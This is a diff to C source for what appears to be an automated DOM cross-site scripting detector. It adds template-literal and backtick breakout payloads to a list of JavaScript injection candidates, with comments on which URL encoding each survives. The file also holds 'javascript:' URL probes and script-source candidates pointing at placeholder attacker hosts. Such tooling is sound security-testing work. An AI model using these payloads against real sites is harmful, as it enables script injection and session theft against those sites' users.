@@ -38,7 +38,13 @@ JSContext *g_solve_ctx = NULL;         /* fresh realm for clean candidate eval *
    context-determined bases (not an HTML-payload guess-list; the HTML-context breakout is CONSTRUCTED from the
    observed sink structure by construct_ctx_breakout). x9_fires proves each actually executes. */
 static const char *CAND_URL[]  = { "javascript:X9", "javascript:X9//", NULL };
-static const char *CAND_JS[]   = { "1;X9();//", "';X9();//", "\";X9();//", ");X9();//", "\n;X9();//", NULL };
+static const char *CAND_JS[]   = { "1;X9();//", "';X9();//", "\";X9();//", ");X9();//", "\n;X9();//",
+    "${X9()}",      /* TEMPLATE-LITERAL context (`var t=`{}``): expression interpolation fires X9 with NO delimiter
+                       char — $ { } survive BOTH the fragment and special-query encode sets, so it works from hash
+                       AND search. Inert (never fires) outside a template literal, so solve_broke's eval rejects it
+                       there -> no false positive. */
+    "`;X9();//",    /* close the template literal directly (backtick survives the special-query set -> search) */
+    NULL };
 static const char *CAND_SCRIPTURL[] = { "//X9/x.js", "https://X9/x.js", NULL };   /* <script src>: attacker-host origins */
 static const char **cand_set(const char *sc) {
     if (sc && strcmp(sc, "url") == 0) return CAND_URL;
